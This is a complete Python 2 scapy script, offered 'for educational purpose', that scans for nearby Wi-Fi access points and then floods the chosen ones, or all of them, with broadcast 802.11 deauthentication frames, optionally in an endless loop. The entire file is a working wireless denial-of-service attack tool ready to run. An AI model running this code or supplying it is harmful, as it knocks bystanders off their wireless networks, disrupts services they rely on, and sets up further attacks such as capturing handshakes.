#!/usr/bin/python

"""
===============================================================
++++++++++++++++++++++++ READ ME ++++++++++++++++++++++++++++++
===============================================================



Author :

    	Suraj Singh
    	Admin
    	S.S.B Group
    	surajsinghbisht054@gmail.com
    	www.bitforestinfo.com


    	Note: We Feel Proud To Be Indian


This Script Created Only For Practise And Educational Purpose Only
The Author Will Not Take Any Responsibility Of Any illegal Activity.


"""

# Required Data Feild
Feild = {
# Key      Value  Required
'iface'	     			: (None, True), 
'ap_timeout' 			: (30,   False), 
'deauthentication_packets' 	: (2,    False)
}



# Import Module
import time
import sys
from scapy.all import *


# Function For Finding Available Access Points
def GetAPStation(*args,  **kwargs):
	ap=[]
	packets=[]
	def PacketFilter(pkt):
		if pkt.haslayer(Dot11Elt) and pkt.type == 0 and pkt.subtype == 8:
			if pkt.addr2 not in ap:
				ap.append(pkt.addr2)
				packets.append(pkt)


	sniff(prn=PacketFilter, *args, **kwargs)
	return (ap, packets)


# Deauth Packet Creator
def Block(client=None, Station=None):
	c = client or "FF:FF:FF:FF:FF:FF"
	if not Station:
		return None
	pkt = RadioTap()/Dot11(addr1=c, addr2=Station, addr3=Station)/Dot11Deauth()
	#print pkt.__repr__()
	return pkt



# Sending Function
def PacketSender(interface, pkt, count=1, gap=0.5, deauth=1):
	#conf.iface = interface
	for i in range(deauth):
		sendp(pkt,iface=interface, count=count)
		time.sleep(gap)
	return





# Main Function
def main(iface=None, ap_timeout=30, deauthentication_packets=2):
	interface = iface
	print "[+] Please Wait For 30 Seconds To Identify Available Access Points"

	# Finding Available AP
	ap=GetAPStation(iface=interface, timeout=ap_timeout)

	# Print Available AP
	for i in ap[1]:
		print "			 [ Packet Captured]		 "
		print "		[+] Address 1	: ", i.addr1
		print "		[+] BSSID	: ", i.addr2
		print "		[+] SSID	: ", i.info

	print "	\n [ Identified Stations List ]	\n\n"+" {}	{}".format("S.no", "Access Points ")

	# Taking User Input
	for i,j in enumerate(ap[0]):
		print " {}	{}".format(i,j)
	print "\n\n"
	a = raw_input("[*] Leave Blank For All Or Enter Stations Numbers Splited With ',' : ")
	if a:
		try:	
			if "," in a:
				a = a.split(",")
				a = [ap[0][int(i)] for i in a]
			else:
				a= [ap[0][int(a)]]
				print "[+] Your Selected Station : ", a
		except:
			print "[+] Default - All Station Selected  : ",
			a=ap[0]
			print a
	else:
		print "[+] Blank Means All Station Selected : ",
		a=ap[0]
		print a

	# Deauthentication packets
	deauthencation = raw_input('\n [+] Leave Blank For loop Or Number Of Deauthentication Packets : ')

	# Packet Sending Engine 
	if deauthencation:
		for i in range(int(deauthencation)):
			for s in a:
				print "[-] {} - Sending Deauth Packets .... ".format(s)
				PacketSender(interface,Block(Station=s), deauth=deauthentication_packets)
		print "Done!"
	else:
		while True:
			for s in a:
				print "[-] {} - Sending Deauth Packets .... ".format(s)
				PacketSender(interface,Block(Station=s), deauth=deauthentication_packets)

	return


# Main Trigger 
if __name__=="__main__":
	if len(sys.argv)==2:
		interface = sys.argv[1]
		print "[*] Starting Packet Sniffing Function On Interface : {}".format(interface)
	else:
		print "[*] Please Provide Interface Name As Argument."
		sys.exit(0)
	main(iface=interface)
